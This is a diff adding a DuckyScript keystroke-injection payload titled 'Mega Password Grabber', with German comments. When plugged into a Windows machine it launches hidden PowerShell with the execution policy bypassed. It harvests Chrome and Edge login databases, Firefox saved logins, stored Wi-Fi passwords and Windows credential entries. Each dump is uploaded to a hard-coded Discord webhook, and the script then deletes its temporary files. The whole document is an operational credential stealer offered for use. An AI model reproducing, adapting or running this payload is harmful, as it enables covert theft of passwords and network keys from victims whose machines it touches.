@@ -1,0 +1,72 @@
+REM Mega Password Grabber - FW1.16 kompatibel
+DELAY 5000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
+
+$webhook = 'https://discordapp.com/api/webhooks/1538959002921082891/wAt-xr1qpPJORXbUXAkET9ScSHueU2vOJmQld7ZJ1DSB4CAj97uydhwcbhizNzsuU0-X'
+
+function Send-ToDiscord {
+    param($file)
+$boundary = [System.Guid]::NewGuid().ToString()
+$LF = \"`r`n\"
+    $bodyLines = (
+\"--$boundary\",
+        \"Content-Disposition: form-data; name=`\"file`\"; filename=`\"$(Split-Path $file 
+-Leaf)`\"\",
+        \"Content-Type: application/octet-stream$LF\",
+[System.IO.File]::ReadAllBytes($file),
+        \"--$boundary--$LF\"
+    ) -join $LF
+Invoke-RestMethod -Uri $webhook -Method Post -ContentType \"multipart/form-data; boundary=$boundary\" -Body $bodyLines
+}
+# 1. Chrome Passwörter
+$chromePass = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"
+if (Test-Path $chromePass) {
+    Copy-Item $chromePass \"$env:TEMP\\chrome_pass.db\"
+$chromeData = \"CHROME PASSWORDS:`n`n\" + (strings \"$env:TEMP\\chrome_pass.db\" | Select-String -Pattern 'http' | Out-String)
+    $chromeData | Out-File \"$env:TEMP\\chrome.txt\"
+    Send-ToDiscord \"$env:TEMP\\chrome.txt\"
+}
+
+# 2. Edge Passwörter
+$edgePass = \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data\"
+if (Test-Path $edgePass) {
+    Copy-Item $edgePass \"$env:TEMP\\edge_pass.db\"
+$edgeData = \"EDGE PASSWORDS:`n`n\" + (strings \"$env:TEMP\\edge_pass.db\" | Select-String -Pattern 'http' | Out-String)
+    $edgeData | Out-File \"$env:TEMP\\edge.txt\"
+    Send-ToDiscord \"$env:TEMP\\edge.txt\"
+}
+
+# 3. Firefox Passwörter
+$firefoxPath = \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\"
+if (Test-Path $firefoxPath) {
+    $profiles = Get-ChildItem $firefoxPath -Directory
+    foreach ($profile in $profiles) {
+$logins = \"$profile\\logins.json\"
+        if (Test-Path $logins) {
+            $firefoxData = Get-Content $logins -Raw | ConvertFrom-Json | Select-Object -ExpandProperty logins
+            $firefoxData | Out-File \"$env:TEMP\\firefox.txt\"
+            Send-ToDiscord \"$env:TEMP\\firefox.txt\"
+        }
+  }
+}
+
+# 4. WLAN Passwörter
+$wlan = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_ -replace '.*: ','' }
+foreach ($network in $wlan) {
+    $password = netsh wlan show profile name=`\"$network`\" key=clear | Select-String 'Key Content' | ForEach-Object { $_ -replace '.*: ','' }
+    \"SSID: $network | Password: $password`n\" | Out-File -Append \"$env:TEMP\\wifi.txt\"
+}
+if (Test-Path \"$env:TEMP\\wifi.txt\") {
+    Send-ToDiscord \"$env:TEMP\\wifi.txt\"
+}
+
+# 5. Windows Credentials
+cmdkey /list | Out-File \"$env:TEMP\\windows_creds.txt\"
+Send-ToDiscord \"$env:TEMP\\windows_creds.txt\"
+# Cleanup
+Remove-Item \"$env:TEMP\\*.txt\" -Force -ErrorAction SilentlyContinue
+Remove-Item \"$env:TEMP\\*.db\" -Force -ErrorAction SilentlyContinue
+"
+ENTER
